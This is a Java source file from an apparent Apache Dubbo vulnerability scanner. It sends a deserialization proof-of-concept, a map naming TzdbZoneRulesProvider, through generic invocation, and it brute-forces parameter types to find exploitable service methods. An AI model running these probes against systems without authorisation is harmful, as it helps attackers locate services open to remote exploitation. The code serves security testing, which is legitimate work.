package scanner.scan;

import com.alibaba.fastjson.JSONObject;
import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.rpc.service.GenericService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import scanner.detection.DubboInfo;
import scanner.exploit.DubboExploiter;
import scanner.utils.Configuration;

import java.io.IOException;
import java.util.*;

import static scanner.Main.DubboInfoMap;

public class DubboScaner extends AbstractScanner {
    public static final String RAW = "raw.return";
    public static final String NATIVE_JAVA = "nativejava";
    private Logger logger = LoggerFactory.getLogger(getClass());

    private String urlBase;
    public String url;
    public String interFace;
    public String method;
    public String version;
    public String[] parameters;
    private DubboInfo dubboInfo = new DubboInfo();

    public DubboScaner(String targetIp, Integer targetPort) {
        exploiter = new DubboExploiter();
        ip = targetIp;
        port = targetPort;
        urlBase = "dubbo://" + ip + ":" + port + "/";
    }

    @Override
    public boolean scan() {
        dubboInfo = DubboInfoMap.get(ip);
        if (dubboInfo == null) {
            return false;
        }
        // 如果目标是dubbo3.x，并且存在元数据service，则不需要再去检测其他service
        if (dubboInfo.getVersion().startsWith("3") && dubboInfo.containsKey(dubboInfo.getApplicationName() + "/org.apache.dubbo.metadata.MetadataService")) {
            logger.debug("尝试查找MetadataService");
            url = urlBase + dubboInfo.getApplicationName() + "/org.apache.dubbo.metadata.MetadataService";
            interFace = "org.apache.dubbo.metadata.MetadataService";
            version = "1.0.0";
            method = "getMetadataInfo";
            parameters = new String[]{String.class.getName()};
            try {
                if (sendPoc(getInstance(), RAW).contains("java.lang.ClassCastException: java.time.zone.TzdbZoneRulesProvider cannot be cast to java.lang.String")) {
                    return true;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            for (String serviceName : dubboInfo.keySet()) {
                DubboInfo.Service service = dubboInfo.get(serviceName);
                url = urlBase + serviceName;
                if (service.getMethods().size() != 0) {
                    //已存在方法，尝试利用
                    for (Object args : service.getMethods()) {
                        if (burstService(serviceName, (JSONObject) args)) {
                            logger.info("找到可以利用的方法:");
                            logger.info(serviceName);
                            logger.info(args.toString());
                            return true;
                        }
                    }
                }

            }
        }
        return false;
    }

    private static Map<String, String> getInstance() throws IOException {
        HashMap<String, String> map = new HashMap<String, String>();
        map.put("class", "java.time.zone.TzdbZoneRulesProvider");
        return map;
    }

    public String sendPoc(Object obj, String generic) throws Exception {
        try {
            Object[] args;
            ReferenceConfig<GenericService> referenceConfig = new ReferenceConfig<>();
            referenceConfig.setRetries(0);
            referenceConfig.setApplication(new ApplicationConfig("test"));
            referenceConfig.setGeneric(generic);
            referenceConfig.setInterface(interFace);
            referenceConfig.setUrl(url);
            referenceConfig.setVersion(version);
            GenericService genericService = referenceConfig.get();
            if (obj != null) {
                args = new Object[]{obj};
            } else {
                args = new Object[]{};
            }
            try {
                genericService.$invoke(method, parameters, args);
            } catch (org.apache.dubbo.rpc.RpcException e) {
                return e.getMessage();
            }
        } catch (Exception e) {
            return e.getMessage();
        }
        return "";
    }

    public static ArrayList<String[]> generateCombinations(ArrayList<String> par, int length) {
        ArrayList<String[]> combinations = new ArrayList<>();
        combinations.add(new String[0]);
        for (int i = 1; i <= length; i++) {
            ArrayList<String[]> newCombinations = new ArrayList<>();
            for (String[] combination : combinations) {
                for (String value : par) {
                    if (combination.length < i) {
                        String[] newCombination = Arrays.copyOf(combination, combination.length + 1);
                        newCombination[combination.length] = value;
                        newCombinations.add(newCombination);
                    }
                }
            }
            combinations.addAll(newCombinations);
        }
        combinations.remove(0);
        return combinations;
    }


    private boolean burstService(String serviceName, JSONObject args) {
        ReferenceConfig<GenericService> referenceConfig = new ReferenceConfig<>();
        referenceConfig.setRetries(0);
        referenceConfig.setTimeout(100000);
        referenceConfig.setApplication(new ApplicationConfig("test"));
        referenceConfig.setInterface(serviceName);
        referenceConfig.setUrl(url);
        referenceConfig.setGeneric(DubboScaner.RAW);
        String vers = null;
        if (args.get("version") != null) {
            vers = (String) args.get("version");
            referenceConfig.setVersion(vers);
        }
        GenericService genericService = referenceConfig.get();
        HashMap<String, String> map = new HashMap<>();
        map.put("class", "java.time.zone.TzdbZoneRulesProvider");
        method = args.getString("name");
        ArrayList<String[]> paramList = new ArrayList<>();
        if (args.getJSONArray("parameterTypes") != null) {
            parameters = args.getJSONArray("parameterTypes").toArray(new String[args.getJSONArray("parameterTypes").size()]);
            paramList.add(parameters);
        } else {
            logger.debug("未探测到目标服务" + method + "的参数类型，尝试爆破");
            paramList = generateCombinations(Configuration.methodParametersGuessList, Configuration.methodParametersGuessMaxLength);
        }
        for (String[] params : paramList) {
            ArrayList<Object> args1 = new ArrayList<>();
            args1.add(map);
            for (int i = 1; i < params.length; i++) {
                args1.add(null);
            }
            try {
                genericService.$invoke(method, params, args1.toArray());
            } catch (Exception e) {
                if (e.getMessage().contains("Invalid token!")) {
                    method = args.getString("name");
                    interFace = serviceName;
                    if (vers != null) {
                        version = vers;
                    }
                    logger.debug("找到方法");
                    logger.debug(Arrays.toString(params));
                    parameters = params;
                    return true;
                }
            }
        }
        return false;
    }


    public static void main(String[] args) throws Exception {
        String ip = "127.0.0.1";
        int port = 8088;
        try {
            DubboScaner dubboScaner = new DubboScaner(ip, port);
            dubboScaner.url = "dubbo://127.0.0.1:20880/com.api.testService";
            JSONObject j = new JSONObject();
            j.put("name", "hi");
            dubboScaner.burstService("com.api.testService", j);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

